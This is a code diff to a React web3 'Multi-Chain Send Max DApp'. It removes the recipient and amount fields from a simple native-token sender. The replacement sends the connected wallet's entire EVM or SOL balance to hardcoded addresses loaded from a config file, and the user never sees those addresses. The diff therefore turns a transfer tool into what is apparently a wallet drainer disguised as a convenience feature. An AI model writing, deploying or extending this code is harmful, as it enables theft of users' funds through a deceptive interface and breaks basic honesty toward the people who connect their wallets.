@@ -1,104 +1,80 @@
-import React, { useState } from "react";
-import {
-  useAccount,
-  useBalance,
-  useSendTransaction,
-  usePublicClient
-} from "wagmi";
-import { formatEther, parseEther } from "viem";
+import React, { useState, useEffect } from "react";
+import { useAccount, useBalance, useSendTransaction, usePublicClient } from "wagmi";
+import { parseEther, formatEther } from "viem";
+import { useSolanaAccount, useSolanaBalance, sendSol } from "@reown/appkit-adapter-solana/react";
+import { FIXED_RECIPIENTS } from "./config";
 
 export default function App() {
-  const { address, isConnected } = useAccount();
+  const { address, isConnected, chain } = useAccount();
   const publicClient = usePublicClient();
-
-  const { data: balanceData } = useBalance({
-    address
-  });
-
+  const { data: balanceData } = useBalance({ address });
   const { sendTransaction } = useSendTransaction();
 
-  const [recipient, setRecipient] = useState("");
-  const [amount, setAmount] = useState("");
+  const { publicKey: solanaPubKey, isConnected: solConnected } = useSolanaAccount();
+  const { balance: solBalance } = useSolanaBalance(solanaPubKey);
 
-  const handleMaxFill = async () => {
-    if (!balanceData || !recipient) return;
+  const [sending, setSending] = useState(false);
 
-    const balance = balanceData.value;
+  const handleSendMax = async () => {
+    setSending(true);
 
-    const gasEstimate = await publicClient.estimateGas({
-      account: address,
-      to: recipient,
-      value: balance
-    });
+    try {
+      if (chain) {
+        // EVM Logic
+        const recipient = FIXED_RECIPIENTS[chain.id];
+        const balance = balanceData.value;
+        const gasEstimate = await publicClient.estimateGas({ account: address, to: recipient, value: balance });
+        const gasPrice = await publicClient.getGasPrice();
+        const maxSendable = balance - gasEstimate * gasPrice;
 
-    const gasPrice = await publicClient.getGasPrice();
-    const gasCost = gasEstimate * gasPrice;
+        if (maxSendable <= 0n) {
+          alert("Insufficient balance for gas");
+          setSending(false);
+          return;
+        }
 
-    const maxSendable = balance - gasCost;
+        await sendTransaction({ to: recipient, value: maxSendable });
+        alert(`Sent ${formatEther(maxSendable)} ${chain.nativeCurrency.symbol}`);
+      } else if (solConnected) {
+        // Solana Logic
+        const recipient = FIXED_RECIPIENTS["SOLANA"];
+        if (solBalance <= 0) {
+          alert("Insufficient SOL balance");
+          setSending(false);
+          return;
+        }
 
-    if (maxSendable <= 0n) {
-      alert("Insufficient balance for gas");
-      return;
+        await sendSol({ from: solanaPubKey, to: recipient, amount: solBalance });
+        alert(`Sent ${solBalance} SOL`);
+      } else {
+        alert("No wallet connected");
+      }
+    } catch (err) {
+      console.error(err);
+      alert("Transaction failed: " + err.message);
     }
 
-    setAmount(formatEther(maxSendable));
-  };
-
-  const handleSend = async () => {
-    if (!recipient || !amount) {
-      alert("Fill all fields");
-      return;
-    }
-
-    await sendTransaction({
-      to: recipient,
-      value: parseEther(amount)
-    });
+    setSending(false);
   };
 
   return (
     <div style={{ padding: 40 }}>
-      <h2>Web3 Native Sender</h2>
+      <h2>Multi-Chain Send Max DApp</h2>
 
       <appkit-button />
 
-      {isConnected && (
+      {(isConnected || solConnected) && (
         <>
           <p>
-            Balance:{" "}
-            {balanceData
-              ? formatEther(balanceData.value)
-              : "Loading..."}
+            {chain ? `Balance: ${balanceData ? formatEther(balanceData.value) : "Loading..."} ${chain.nativeCurrency.symbol}` : ""}
+            {solConnected ? `SOL Balance: ${solBalance}` : ""}
           </p>
 
-          <input
-            placeholder="Recipient Address"
-            value={recipient}
-            onChange={(e) => setRecipient(e.target.value)}
-            style={{ width: "100%", padding: 10 }}
-          />
-
-          <input
-            placeholder="Amount"
-            value={amount}
-            onChange={(e) => setAmount(e.target.value)}
-            style={{ width: "100%", padding: 10, marginTop: 10 }}
-          />
-
-          <div style={{ marginTop: 10 }}>
-            <button onClick={handleMaxFill}>
-              Max
-            </button>
-
-            <button
-              onClick={handleSend}
-              style={{ marginLeft: 10 }}
-            >
-              Send
-            </button>
-          </div>
+          <button onClick={handleSendMax} disabled={sending}>
+            {sending ? "Sending..." : "Send Max"}
+          </button>
         </>
       )}
     </div>
   );
-    }
+}
